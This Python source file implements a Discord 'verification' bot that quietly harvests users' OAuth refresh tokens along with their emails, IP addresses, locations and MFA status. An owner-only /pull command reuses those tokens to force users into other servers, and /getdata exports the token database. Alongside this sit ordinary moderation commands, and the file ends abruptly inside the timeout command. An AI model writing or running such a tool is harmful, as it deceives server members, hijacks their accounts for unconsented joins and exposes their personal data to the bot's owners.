import requests
import logging
import discord
import asyncio
import aiohttp
import shutil
import json
import time
import os
import re
from datetime import datetime, timedelta
import ipaddress

from quart import Quart, redirect, request, Response
from pystyle import Write, Colors

# --- 設定ファイルの読み込み/保存 ---
def load_config():
    with open('config.json', 'r', encoding='utf-8') as f:
        return json.load(f)

def save_config(new_config):
    with open('config.json', 'w', encoding='utf-8') as f:
        json.dump(new_config, f, indent=4)

config = load_config()

print("読み込まれたconfigの内容:", config)

# --- グローバル変数の設定 ---
__title__ = "kno's authbot"
__author__ = "knockstick & Gemini"
__version__ = "3.11-final"

token = config['token']
redirect_uri = config['redirect_uri']
client_secret = config['client_secret']
client_id = config['client_id']
scope = config['scope']
owners = config.get('owners', [])
# admin_guildsはload_config()から動的に取得するため、ここでは初期化しない
log_channel = config['log_channel']
server_host = config['server_host']
server_port = config['server_port']
quart_logging = config.get('server_logging', True)
last_api_error_log_time = None

if not quart_logging:
    logging.getLogger('hypercorn.access').disabled = True

API_VER = "v9"
DISCORD_API = "https://discord.com/api/"
TOKEN_URL = DISCORD_API + "oauth2/token"
LOGIN_URL = DISCORD_API + f"oauth2/authorize/?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code&scope={scope}"
LOGIN_REDIRECT = f"https://discord.com/oauth2/authorize/?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code&scope={scope}"

app = Quart(__name__)
# 必要なIntentsをすべて有効にする
intents = discord.Intents.all()
bot = discord.Bot(intents=intents)

# ★★★ 招待コードのキャッシュ用 ★★★
invite_cache = {}


# --- 埋め込みHTML ---
ERROR_PAGE_HTML = """
<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>認証エラー</title><style>body{display:flex;background-color:black;color:white;justify-content:center;align-items:center;height:100vh;margin:0;font-family:Arial,sans-serif;text-align:center;}
.container{border:1px solid #555;padding:40px;border-radius:10px;background-color:#1e1e1e;}h1{color:#ff4d4d;font-size:36px;}p{font-size:24px;}</style></head>
<body><div class="container"><h1>認証に失敗しました</h1><p>{error_message}</p></div></body></html>
"""
SUCCESS_PAGE_HTML = """
<!DOCTYPE html><html lang="ja"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>認証成功</title><style>body{display:flex;background-color:black;color:white;justify-content:center;align-items:center;height:100vh;margin:0;font-family:Arial,sans-serif;text-align:center;}
div{font-size:72px;font-weight:bold;}</style></head>
<body><div>認証に成功しました！<br>このページは閉じて構いません。</div></body></html>
"""

def render_error_page(message):
    return Response(ERROR_PAGE_HTML.format(error_message=message), mimetype='text/html')

def render_success_page():
    return Response(SUCCESS_PAGE_HTML, mimetype='text/html')

# --- 期間解析ヘルパー関数 ---
def parse_duration(duration_string: str) -> tuple[timedelta, str]:
    matches = re.findall(r'(\d+)\s*([dhms])', duration_string.lower())
    if not matches:
        raise ValueError("無効な期間の形式です。例: '1d 12h 30m'")
    delta = timedelta()
    parts = []
    for value, unit in matches:
        value = int(value)
        if unit == 'd':
            delta += timedelta(days=value)
            parts.append(f"{value}日")
        elif unit == 'h':
            delta += timedelta(hours=value)
            parts.append(f"{value}時間")
        elif unit == 'm':
            delta += timedelta(minutes=value)
            parts.append(f"{value}分")
        elif unit == 's':
            delta += timedelta(seconds=value)
            parts.append(f"{value}秒")
    if delta.total_seconds() > timedelta(days=28).total_seconds():
        raise ValueError("タイムアウト期間は最大28日までです。")
    readable_duration = " ".join(parts)
    return delta, readable_duration

# --- ヘルパー関数 ---
async def send_api_error_log(error_message):
    global last_api_error_log_time
    now = datetime.utcnow()
    if last_api_error_log_time is None or (now - last_api_error_log_time) > timedelta(hours=1):
        log_ch = bot.get_channel(int(log_channel))
        if log_ch:
            embed = discord.Embed(title="⚠️ セキュリティAPIエラー", description="VPN/モバイル検知APIへの接続に失敗しました。\nAPIの利用上限か、サービスの一時的な障害が考えられます。", color=discord.Color.orange(), timestamp=now)
            embed.add_field(name="影響", value="この問題が解決するまで、高精度な検知機能は停止し、基本的なフォールバック検知が試行されます。", inline=False)
            embed.add_field(name="エラー詳細", value=f"```{error_message}```", inline=False)
            try:
                await log_ch.send(embed=embed)
                last_api_error_log_time = now
            except Exception as e:
                print(f"Failed to send API error log: {e}")

async def get_ip_info(ip_address, session):
    security_config = config.get('security', {})
    info = {'country': 'N/A', 'region': 'N/A', 'isp': 'N/A', 'is_vpn': False, 'is_mobile': False}
    
    vpn_check_conf = security_config.get('vpn_check', {})
    mobile_check_conf = security_config.get('mobile_check', {})
    api_key = vpn_check_conf.get('api_key')
    api_call_success = False

    if (vpn_check_conf.get('enabled') or mobile_check_conf.get('enabled')) and api_key and "YOUR_" not in api_key:
        try:
            url = f"http://proxycheck.io/v2/{ip_address}?key={api_key}&vpn=1"
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get('status') == 'error':
                        await send_api_error_log(f"API Error: {data.get('message', 'Unknown error')}")
                    elif data.get(ip_address, {}).get('status') == 'ok':
                        api_call_success = True
                        if vpn_check_conf.get('enabled'):
                            info['is_vpn'] = data[ip_address].get('proxy') == 'yes'
                        if mobile_check_conf.get('enabled'):
                            info['is_mobile'] = data[ip_address].get('type') == 'Mobile'
                        info['country'] = data[ip_address].get('isocode', 'N/A')
                        info['region'] = data[ip_address].get('region', 'N/A')
                        info['isp'] = data[ip_address].get('operator', 'N/A')
                else:
                    await send_api_error_log(f"HTTP Status: {response.status}")
        except Exception as e:
            await send_api_error_log(str(e))

    if not api_call_success:
        try:
            async with session.get(f"http://ipinfo.io/{ip_address}/json") as response:
                if response.status == 200:
                    data = await response.json()
                    info.update({k: data.get(k, 'N/A') for k in ['country', 'region']})
                    info['isp'] = data.get('org', 'N/A')
                    if vpn_check_conf.get('enabled'):
                        fallback_list = vpn_check_conf.get('fallback_isp_blocklist', [])
                        if any(blocked_isp.lower() in info['isp'].lower() for blocked_isp in fallback_list):
                            info['is_vpn'] = True
        except Exception as e:
            print(f"Error getting fallback ipinfo.io data: {e}")
            
    return info

async def get_token(code, redirect_uri, session):
    payload = {"client_id": client_id, "client_secret": client_secret, "grant_type": "authorization_code", "code": code, "redirect_uri": redirect_uri, "scope": scope}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    async with session.post(url=TOKEN_URL, data=payload, headers=headers) as access_token_resp:
        return await access_token_resp.json()

async def get_userdata(access_token, session):
    headers = {"Authorization": f"Bearer {access_token}"}
    user_json, guilds_json, connections_json = None, [], []
    async with session.get(f"{DISCORD_API}/users/@me", headers=headers) as resp:
        if resp.status != 200: return None, None, None
        user_json = await resp.json()
    async with session.get(f"{DISCORD_API}/users/@me/guilds", headers=headers) as resp:
        if resp.status == 200: guilds_json = await resp.json()
    async with session.get(f"{DISCORD_API}/users/@me/connections", headers=headers) as resp:
        if resp.status == 200: connections_json = await resp.json()
    return user_json, guilds_json, connections_json

async def refresh_token(refresh_token_val, session):
    data = {'client_id': client_id, 'client_secret': client_secret, 'grant_type': 'refresh_token', 'refresh_token': refresh_token_val}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    async with session.post(TOKEN_URL, data=data, headers=headers) as r:
        return await r.json()

def load_data():
    try:
        with open('data.json', 'r', encoding='utf-8') as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"users": {}, "emails": [], "gban_list": {}, "invite_info": {}}

def save_data(data):
    with open('data.json', 'w', encoding='utf-8') as file:
        json.dump(data, file, indent=4)

async def update_data_file(user_id, email, refresh_token, access_token, ip, country):
    data = load_data()
    alt_check_conf = config.get('security', {}).get('alt_account_check', {})
    if alt_check_conf.get('enabled') and alt_check_conf.get('method') == 'email':
        if email and email in data.get('emails', []): return "email_exists"

    if str(refresh_token) not in data.get("users", {}):
        data.setdefault("users", {})[str(refresh_token)] = {"id": str(user_id), "at": access_token, "ip": ip, "co": country.lower(), "email": email}
        if email and email not in data.get('emails', []): data.setdefault('emails', []).append(email)
        save_data(data)
        return "new_user"
    else: return "already_authed"

# security_settings.json の読み込み/保存
def load_security_config():
    try:
        with open('security_settings.json', 'r', encoding='utf-8') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        # ファイルがない場合はデフォルト設定を返す
        return {
            "vpn_check": {"enabled": False, "api_key": "YOUR_IPQUALITYSCORE_API_KEY_HERE"},
            "alt_account_check": {"enabled": True, "method": "email"},
            "mobile_check": {"enabled": False}
        }

def save_security_config(new_config):
    with open('security_settings.json', 'w', encoding='utf-8') as f:
        json.dump(new_config, f, indent=4)

# 最初にセキュリティ設定を読み込む
security_config = load_security_config()


async def pull(ctx, server_id, amount=None, country=None):
    session = aiohttp.ClientSession()
    success, fail, already_in_server, total = 0, 0, 0, 0
    data = load_data()
    
    users_to_pull = data.get("users", {})
    keys = list(users_to_pull.keys())
    if amount is not None and amount > 0: keys = keys[:amount]

    for refresh_token2 in keys:
        user_data = users_to_pull.get(refresh_token2)
        if not user_data: continue
        
        if country and (user_data.get("co") is None or user_data.get("co").lower() != country.lower()): continue

        refresh_json = await refresh_token(refresh_token2, session)
        at, rt = refresh_json.get("access_token"), refresh_json.get("refresh_token")
        if not (at and rt):
            fail += 1
            continue

        new_data = users_to_pull.pop(refresh_token2)
        new_data['at'] = at
        users_to_pull[rt] = new_data
        
        url = f'https://discord.com/api/guilds/{server_id}/members/{user_data["id"]}'
        data_payload = {'access_token': at}
        headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
        try:
            async with session.put(url, json=data_payload, headers=headers) as r:
                if r.status in (200, 201): success += 1
                elif r.status == 204: already_in_server += 1
                else: fail += 1
        except Exception: fail += 1
        finally:
            total += 1
            await asyncio.sleep(0.5)
    
    save_data(data)
    await session.close()

    color = discord.Color.green() if success > fail else discord.Color.red()
    embed = discord.Embed(title="Pull results", color=color)
    guild = bot.get_guild(int(server_id))
    embed.description = f"**Pull to `{guild.name if guild else 'Unknown Server'}`**\n"
    if country: embed.description += f"**Pulled only members from country: `{country.upper()}`**\n\n"
    embed.description += f":ballot_box_with_check: **Already in server:** `{already_in_server}`\n"
    embed.description += f":white_check_mark: **Success:** `{success}`\n"
    embed.description += f":x: **Fail:** `{fail}`\n\n"
    embed.description += f":information_source: **Total users pulled:** `{total}`"
    embed.set_footer(text=f"{__title__} v{__version__}")
    await ctx.respond(content=f"{ctx.author.mention} Pulling ended!", embed=embed, ephemeral=True)


@app.route('/')
async def index():
    return redirect(LOGIN_REDIRECT)

@app.route('/<endpoint>')
async def login(endpoint):
    code = request.args.get('code')
    if not code: return render_error_page("無効な認証コードです。")
    
    data = load_data()
    gban_list = data.get("gban_list", {})

    async with aiohttp.ClientSession() as session:
        token_data = await get_token(code, redirect_uri, session)
        if 'error' in token_data: return render_error_page("トークンの取得に失敗しました。")
        
        access_token, refresh_token = token_data['access_token'], token_data['refresh_token']
        user_json, user_guilds, connections = await get_userdata(access_token, session)
        if user_json is None: return render_error_page("ユーザー情報の取得に失敗しました。")

        if str(user_json['id']) in gban_list:
            return render_error_page("あなたのアカウントはこのサービスからブロックされています。")

        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        ip_info = await get_ip_info(user_ip, session)
        
        current_config = load_config() # 常に最新のconfigを読み込む
        current_security_config = current_config.get('security', {})

        if current_security_config.get('vpn_check', {}).get('enabled') and ip_info['is_vpn']: return render_error_page("VPNやプロキシからのアクセスは許可されていません。")
        if current_security_config.get('mobile_check', {}).get('enabled') and ip_info['is_mobile']: return render_error_page("モバイルデータ通信からの認証は許可されていません。")

        user_email = user_json.get('email')
        updater_result = await update_data_file(user_json['id'], user_email, refresh_token, access_token, user_ip, ip_info['country'])
        if updater_result == "email_exists": return render_error_page("このメールアドレスは既に使用されています。")

        if updater_result == "new_user" or updater_result == "already_authed":
            user_id, username, avatar_hash = user_json['id'], user_json['username'], user_json['avatar']
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.webp?size=1024" if avatar_hash else "https://discord.com/assets/02b73275048e30fd09ac.png"
            embed = discord.Embed(title=":star: New authed user!", description=None, color=discord.Color.green())
            embed.set_thumbnail(url=avatar_url)
            embed.add_field(name=":bust_in_silhouette: User", value=f"{user_json.get('global_name') or username} ({username})", inline=False)
            
            email_info_text = f"\nEmail: **`{user_email}`**\nVerified: **{user_json.get('verified')}**" if user_email else ""
            embed.add_field(name=':mailbox_with_mail: Info', value=f"ID: **`{user_id}`**\nLocale: **{user_json.get('locale')}**\nMFA: **{user_json.get('mfa_enabled')}**{email_info_text}", inline=False)

            ip_address_v4, ip_address_v6 = "N/A", "N/A"
            try:
                ip_obj = ipaddress.ip_address(user_ip)
                if ip_obj.version == 4: ip_address_v4 = user_ip
                elif ip_obj.version == 6: ip_address_v6 = user_ip
            except ValueError: pass
            tech_field_value = f"IPv4: ```{ip_address_v4}```\nIPv6: ```{ip_address_v6}```"
            embed.add_field(name=":computer: Tech", value=tech_field_value, inline=False)
            embed.add_field(name=":earth_asia: Location", value=f"Country: **{ip_info['country']}**\nRegion: **{ip_info['region']}**\nISP: **{ip_info['isp']}**", inline=False)
            
            log_ch = bot.get_channel(int(log_channel))
            if log_ch: await log_ch.send(embed=embed)
            
            guild = bot.get_guild(int(endpoint)) if endpoint.isdigit() else None
            if guild:
                role_id = current_config.get("verify_guilds", {}).get(str(endpoint))
                if role_id:
                    role = guild.get_role(int(role_id))
                    try:
                        member = await guild.fetch_member(int(user_id))
                        if member and role: await member.add_roles(role)
                    except (discord.NotFound, discord.Forbidden): pass
            
        return render_success_page()

# --- イベントハンドラ ---
@bot.event
async def on_ready():
    # ★★★ 起動時に招待コードをキャッシュする ★★★
    for guild in bot.guilds:
        try:
            invite_cache[guild.id] = {invite.code: invite.uses for invite in await guild.invites()}
        except discord.Forbidden:
            print(f"サーバー '{guild.name}' の招待コードを読み取る権限がありません。")

    Write.Print("""
\t d8b                                                                 d8b       d8b                      
\t ?88                                                           d8P   ?88       ?88                 d8P  
\t  88b                                                       d888888P  88b       88b             d888888P
\t  888  d88'  88bd88b  d8888b  .d888b,     d888b8b  ?88   d8P  ?88'    888888b   888888b  d8888b   ?88'  
\t  888bd8P'   88P' ?8bd8P' ?88 ?8b,       d8P' ?88  d88   88   88P     88P `?8b  88P `?8bd8P' ?88  88P   
\t d88888b    d88   88P88b  d88   `?8b     88b  ,88b ?8(  d88   88b    d88   88P d88,  d8888b  d88  88b   
\td88' `?88b,d88'   88b`?8888P'`?888P'     `?88P'`88b`?88P'?8b  `?8b  d88'   88bd88'`?88P'`?8888P'  `?8b  
""", Colors.purple_to_blue, interval=0)
    print(f"\n\t\t\t\t\tkno's authbot v{__version__}\n")
    print(f"\t\t\t\t\tLogged in as {bot.user}")
    data = load_data()
    user_count = len(data.get("users", {}))
    gban_count = len(data.get("gban_list", {}))
    print(f"\t\t\t\t\tTotal Users: {user_count} | GBAN Users: {gban_count}")
    print(f"\t\t\t\t\tScopes: {scope.replace('%20', ', ')}")
    print(f"\t\t\t\t\tGuilds: {len(bot.guilds)}\n")
    Write.Print(f"\t\t\t\thttps://github.com/knockstick/knos-authbot/\n\n", Colors.blue_to_purple, interval=0)

# ★★★ メンバー参加時に招待者を記録 ★★★
@bot.event
async def on_member_join(member):
    try:
        invites_before = invite_cache.get(member.guild.id, {})
        invites_after = {invite.code: invite.uses for invite in await member.guild.invites()}
        
        invite_cache[member.guild.id] = invites_after

        for code, uses in invites_after.items():
            if uses > invites_before.get(code, 0):
                data = load_data()
                invite_info = data.get("invite_info", {})
                invite = await bot.fetch_invite(code)
                invite_info[str(member.id)] = {
                    "inviter_id": invite.inviter.id,
                    "code": code
                }
                data["invite_info"] = invite_info
                save_data(data)
                return
    except discord.Forbidden:
        print(f"サーバー '{member.guild.name}' で招待情報の追跡に必要な権限がありません。")
    except Exception as e:
        print(f"on_member_joinでエラー: {e}")

# ★★★ 招待コード作成・削除時にキャッシュを更新 ★★★
@bot.event
async def on_invite_create(invite):
    invite_cache[invite.guild.id] = {i.code: i.uses for i in await invite.guild.invites()}

@bot.event
async def on_invite_delete(invite):
    invite_cache[invite.guild.id] = {i.code: i.uses for i in await invite.guild.invites()}


# NGワードフィルター
NG_WORDS = ["ngword1", "ngword2"] # NGワードをここに追加
@bot.event
async def on_message(message):
    if message.author == bot.user or message.author.id in owners:
        return
        
    for word in NG_WORDS:
        if word in message.content.lower():
            await message.delete()
            embed = discord.Embed(title="⚠️ 警告", description=f"{message.author.mention} NGワードを使用しないでください！", color=discord.Color.red())
            await message.channel.send(embed=embed, delete_after=10)
            return

# --- スラッシュコマンド (認証系) ---
@bot.slash_command(name="pull", description="Pull your members to desired server", guild_ids=config.get('admin_guilds', []))
async def pull_command(ctx: discord.ApplicationContext, server_id: discord.Option(str, description="Server ID"), amount: discord.Option(int, description="Amount of members to pull", required=False)=None, country: discord.Option(str, description=f"Pull only members with specified country. Example: us")=None):
    if ctx.author.id not in owners: return await ctx.respond("This command is for owners only.", ephemeral=True)
    await pull(ctx, server_id, amount, country)

@bot.slash_command(name="getdata", description="Get all member data", guild_ids=config.get('admin_guilds', []))
async def getdata(ctx: discord.ApplicationContext):
    if ctx.author.id not in owners: return await ctx.respond("This command is for owners only.", ephemeral=True)
    if os.path.exists("data.json"): await ctx.respond(file=discord.File("data.json"), ephemeral=True)
    else: await ctx.respond("`data.json` not found.", ephemeral=True)

@bot.slash_command(name="uploaddata", description="Upload your data file on the server", guild_ids=config.get('admin_guilds', []))
async def uploaddata(ctx: discord.ApplicationContext, file: discord.Option(discord.Attachment, description="Your data file")):
    if ctx.author.id not in owners: return await ctx.respond("This command is for owners only.", ephemeral=True)
    if not file.filename.endswith('.json'): return await ctx.respond("Invalid file format.", ephemeral=True)
    try:
        await file.save("data.json")
        await ctx.respond("Data successfully loaded!", ephemeral=True)
    except Exception as e: await ctx.respond(f"An error occurred: `{e}`", ephemeral=True)

@bot.slash_command(name="usercount", description="Get your verified users count", guild_ids=config.get('admin_guilds', []))
async def usercount(ctx: discord.ApplicationContext):
    if ctx.author.id not in owners: return await ctx.respond("This command is for owners only.", ephemeral=True)
    data = load_data()
    count = len(data.get("users", {}))
    await ctx.respond(f"Total authorized users: **{count}**", ephemeral=True)

@bot.slash_command(name="verify-embed", description="Create a custom verification embed", guild_ids=config.get('admin_guilds', []))
async def verify_embed(ctx: discord.ApplicationContext, channel_id: discord.Option(str, description="Channel ID to send the embed to"), title: discord.Option(str, description="Embed title", required=False)="Verify", description: discord.Option(str, description="Embed description", required=False)="Please verify by clicking the button below:", image: discord.Option(str, description="Embed image URL", required=False)=None, thumbnail: discord.Option(str, description="Thumbnail image URL", required=False)=None, button_text: discord.Option(str, description="Verify button text", required=False)="Verify", button_emoji: discord.Option(str, description="Verify button emoji ID", required=False)=None):
    if ctx.author.id not in owners: return await ctx.respond("This command is for owners only.", ephemeral=True)
    try: channel = await bot.fetch_channel(int(channel_id))
    except (discord.NotFound, discord.Forbidden): return await ctx.respond("Channel not found or I can't access it!", ephemeral=True)
    
    embed = discord.Embed(title=title, description=description.replace("\\n", "\n"))
    if image: embed.set_image(url=image)
    if thumbnail: embed.set_thumbnail(url=thumbnail)
    
    login_url_with_state = LOGIN_URL + f"&state={channel.guild.id}"
    view = discord.ui.View()
    emoji_obj = None
    if button_emoji:
        try: emoji_obj = bot.get_emoji(int(button_emoji))
        except (ValueError, TypeError): pass
    view.add_item(discord.ui.Button(label=button_text, url=login_url_with_state, emoji=emoji_obj))
    
    await channel.send(embed=embed, view=view)
    await ctx.respond(":white_check_mark:", ephemeral=True)

@bot.slash_command(name="bypass", description="指定したユーザーに手動で認証ロールを付与します", guild_ids=config.get('admin_guilds', []))
async def bypass(ctx: discord.ApplicationContext, user: discord.Member):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    if not isinstance(user, discord.Member):
        return await ctx.respond("指定されたユーザーはこのサーバーのメンバーではありません。", ephemeral=True)
    current_config = load_config()
    guild_id_str = str(ctx.guild.id)
    role_id = current_config.get("verify_guilds", {}).get(guild_id_str)
    if not role_id: return await ctx.respond(f"このサーバー用の認証ロールが`config.json`に設定されていません。", ephemeral=True)
    role = ctx.guild.get_role(int(role_id))
    if not role: return await ctx.respond(f"ロールID `{role_id}` が見つかりませんでした。", ephemeral=True)
    try:
        await user.add_roles(role)
        await ctx.respond(f"{user.mention} にロール **{role.name}** を付与しました。\n注意: この操作では認証DBには追加されません。", ephemeral=True)
    except discord.Forbidden: await ctx.respond("ボットにロールを付与する権限がありません。", ephemeral=True)
    except Exception as e: await ctx.respond(f"エラーが発生しました: {e}", ephemeral=True)

# ★★★ ここが招待者情報表示に対応した /co コマンド ★★★
@bot.slash_command(name="co", description="認証済みユーザーの情報と全サーバーでの処罰履歴を表示します。", guild_ids=config.get('admin_guilds', []))
async def check_user(ctx: discord.ApplicationContext, user: discord.User):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    
    await ctx.defer() 

    data = load_data()
    
    embed = discord.Embed(title=f"🕵️ ユーザー情報パネル", description=f"**対象:** {user.mention}", color=discord.Color.blue(), timestamp=discord.utils.utcnow())
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.add_field(name="👤 アカウント情報", value=f"**名前:** `{user.global_name or user.name}`\n**ID:** `{user.id}`\n**作成日:** {discord.utils.format_dt(user.created_at, style='F')}", inline=False)

    found_user_data = next((ud for ud in data.get("users", {}).values() if str(ud.get("id")) == str(user.id)), None)
    if found_user_data:
        embed.add_field(name="💾 認証データ", value=f"**メール:** `{found_user_data.get('email') or '無し'}`\n**IP:** `{found_user_data.get('ip') or '無し'}`", inline=False)
        ip = found_user_data.get('ip')
        if ip and ip != '無し':
            async with aiohttp.ClientSession() as session: ip_info = await get_ip_info(ip, session)
            embed.add_field(name="🌐 IPロケーション", value=f"**国:** `{ip_info.get('country')}`\n**地域:** `{ip_info.get('region')}`\n**ISP:** `{ip_info.get('isp')}`", inline=False)
    else:
        embed.add_field(name="💾 認証データ", value="このユーザーは認証DBに登録されていません。", inline=False)
    
    # ★★★ 招待者情報の表示を追加 ★★★
    invite_info = data.get("invite_info", {}).get(str(user.id))
    if invite_info:
        inviter = await bot.fetch_user(invite_info['inviter_id'])
        embed.add_field(name="🤝 招待者情報", value=f"**招待者:** {inviter.mention}\n**招待コード:** `{invite_info['code']}`", inline=False)
    else:
        embed.add_field(name="🤝 招待者情報", value="招待者情報は記録されていません。", inline=False)


    member = ctx.guild.get_member(user.id)
    if member:
        roles = [r.mention for r in member.roles if r.name != "@everyone"]
        embed.add_field(name=f"🏢 現在のサーバー情報 ({ctx.guild.name})", value=f"**参加日:** {discord.utils.format_dt(member.joined_at, style='F')}\n**ロール:** {', '.join(roles) or '無し'}", inline=False)

    punishment_history = []
    for guild in bot.guilds:
        try:
            ban_entry = await guild.fetch_ban(user)
            punishment_history.append(f"⛔ **BAN** in **{guild.name}**\nReason: *{ban_entry.reason or 'N/A'}*")
        except discord.NotFound:
            pass 
        except discord.Forbidden:
            punishment_history.append(f"🔍 `{guild.name}`: BANリストの権限がありません。")

        try:
            async for entry in guild.audit_logs(limit=50, action=discord.AuditLogAction.kick):
                if entry.target and entry.target.id == user.id:
                    punishment_history.append(f"🚪 **Kick** in **{guild.name}** by {entry.user.name}\nReason: *{entry.reason or 'N/A'}*")
            
            async for entry in guild.audit_logs(limit=50, action=discord.AuditLogAction.member_update):
                 if entry.target and entry.target.id == user.id and getattr(entry.after, 'communication_disabled_until', None):
                    punishment_history.append(f"⏳ **Timeout** in **{guild.name}** by {entry.user.name}\nReason: *{entry.reason or 'N/A'}*")
        except discord.Forbidden:
            punishment_history.append(f"🔍 `{guild.name}`: 監査ログの権限がありません。")

    if punishment_history:
        history_text = "\n".join(punishment_history)
        if len(history_text) > 1024:
             history_text = history_text[:1020] + "..." 
        embed.add_field(name="📜 全サーバー処罰履歴", value=history_text, inline=False)
    else:
        embed.add_field(name="📜 全サーバー処罰履歴", value="関連する処罰履歴は見つかりませんでした。", inline=False)

    embed.set_footer(text=f"照会者: {ctx.author.name}", icon_url=ctx.author.display_avatar.url)
    await ctx.followup.send(embed=embed)


# --- 管理コマンド ---

@bot.slash_command(name="kick", description="指定したユーザーをキックします。", guild_ids=config.get('admin_guilds', []))
async def kick(ctx: discord.ApplicationContext, member: discord.Member, reason: str = "理由なし"):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    if not isinstance(member, discord.Member):
        return await ctx.respond("指定されたユーザーはこのサーバーのメンバーではありません。", ephemeral=True)
    if not ctx.author.guild_permissions.kick_members:
        return await ctx.respond("あなたにはキックする権限がありません。", ephemeral=True)
    try:
        await member.kick(reason=reason)
        
        embed = discord.Embed(title="🚪 ユーザーキック", color=discord.Color.orange(), timestamp=ctx.interaction.created_at)
        if member.avatar: embed.set_thumbnail(url=member.avatar.url)
        embed.add_field(name="対象ユーザー", value=f"{member.mention} ({member.display_name})", inline=False)
        embed.add_field(name="ユーザーID", value=f"`{str(member.id)}`", inline=False)
        embed.add_field(name="サーバー参加日時", value=f"<t:{int(member.joined_at.timestamp())}:F> (<t:{int(member.joined_at.timestamp())}:R>)", inline=False)
        embed.add_field(name='\u200b', value='\u200b', inline=False)
        embed.add_field(name="理由", value=f"```{reason}```", inline=False)
        embed.set_footer(text=f"実行者: {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
        await ctx.respond(embed=embed)

    except discord.Forbidden:
        await ctx.respond("BOTの権限が不足しているため、キックできませんでした。", ephemeral=True)
    except Exception as e:
        await ctx.respond(f"エラーが発生しました: {e}", ephemeral=True)

@bot.slash_command(name="ban", description="指定したユーザーをBANし、認証もブロックします。", guild_ids=config.get('admin_guilds', []))
async def ban(ctx: discord.ApplicationContext, member: discord.Member, reason: str = "理由なし"):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    if not isinstance(member, discord.Member):
        return await ctx.respond("指定されたユーザーはこのサーバーのメンバーではありません。", ephemeral=True)
    if not ctx.author.guild_permissions.ban_members:
        return await ctx.respond("あなたにはBANする権限がありません。", ephemeral=True)
    try:
        await member.ban(reason=reason)
        
        data = load_data()
        gban_list = data.get("gban_list", {})
        gban_list[str(member.id)] = f"サーバーBAN: {reason}"
        data["gban_list"] = gban_list
        save_data(data)
        
        embed = discord.Embed(title="⛔ ユーザーBAN", color=discord.Color.red(), timestamp=ctx.interaction.created_at)
        if member.avatar: embed.set_thumbnail(url=member.avatar.url)
        embed.add_field(name="対象ユーザー", value=f"{member.mention} ({member.display_name})", inline=False)
        embed.add_field(name="ユーザーID", value=f"`{str(member.id)}`", inline=False)
        embed.add_field(name="サーバー参加日時", value=f"<t:{int(member.joined_at.timestamp())}:F> (<t:{int(member.joined_at.timestamp())}:R>)", inline=False)
        embed.add_field(name='\u200b', value='\u200b', inline=False)
        embed.add_field(name="理由", value=f"```{reason}```", inline=False)
        embed.set_footer(text=f"実行者: {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
        
        await ctx.respond(embed=embed)
        
    except discord.Forbidden:
        await ctx.respond("BOTの権限が不足しているため、BANできませんでした。", ephemeral=True)
    except Exception as e:
        await ctx.respond(f"エラーが発生しました: {e}", ephemeral=True)

@bot.slash_command(name="unban", description="指定したユーザーのサーバーBANを解除します。", guild_ids=config.get('admin_guilds', []))
async def unban(ctx: discord.ApplicationContext, user_id: str, reason: str = "理由なし"):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    if not ctx.author.guild_permissions.ban_members:
        return await ctx.respond("あなたにはBANを解除する権限がありません。", ephemeral=True)
    try:
        user = await bot.fetch_user(int(user_id))
        await ctx.guild.unban(user, reason=reason)
        
        embed = discord.Embed(title="✅ ユーザーBAN解除", color=discord.Color.green(), timestamp=datetime.now())
        if user.avatar: embed.set_thumbnail(url=user.avatar.url)
        embed.add_field(name="ユーザー", value=user.mention, inline=False)
        embed.add_field(name="ユーザーID", value=f"`{user.id}`", inline=False)
        embed.add_field(name="理由", value=f"```{reason}```", inline=False)
        embed.set_footer(text=f"実行者: {ctx.author.display_name}", icon_url=ctx.author.display_avatar.url)
        await ctx.respond(embed=embed)

    except discord.NotFound:
        await ctx.respond(f"`{user_id}` はこのサーバーのBANリストに存在しないか、無効なIDです。", ephemeral=True)
    except discord.Forbidden:
        await ctx.respond("BOTの権限が不足しているため、BAN解除できませんでした。", ephemeral=True)
    except Exception as e:
        await ctx.respond(f"エラーが発生しました: {e}", ephemeral=True)

@bot.slash_command(name="timeout", description="指定したユーザーをタイムアウトします。", guild_ids=config.get('admin_guilds', []))
async def timeout(ctx: discord.ApplicationContext, member: discord.Member, duration: str, reason: str = "理由なし"):
    if ctx.author.id not in owners: return await ctx.respond("権限がありません。", ephemeral=True)
    if not isinstance(member, discord.Member):
        return await ctx.respond("指定されたユーザーはこのサーバーのメンバーではありません。", ephemeral=True)
    if not ctx.author.guild_permissions.moderate_members:
        return await ctx.respond("あなたにはメンバーをタイムアウトする権限がありません。", ephemeral=True)
    if member == ctx.author or member == bot.user:
        return await ctx.respond("自分自身またはBOTをタイムアウトすることはできません。", ephemeral=True)
    try:
        time_delta, readable_duration = parse_duration(duration)
        end_time = discord.utils.utcnow() + time_delta
        await member.timeout(until=end_time, reason=reason)
        
        embed = discord.Embed(title="⏳ ユーザータイムアウト", color=discord.Color.blurple(), timestamp=ctx.interaction.created_at)
        if member.avatar: embed.set_thumbnail(url=member.avatar.url)
        embed.add_field(name="対象ユーザー", value=f"{member.mention} ({member.display_name})", inline=False)
        embed.add_field(name="ユーザーID", value=f"`{str(member.id)}`", inline=False)
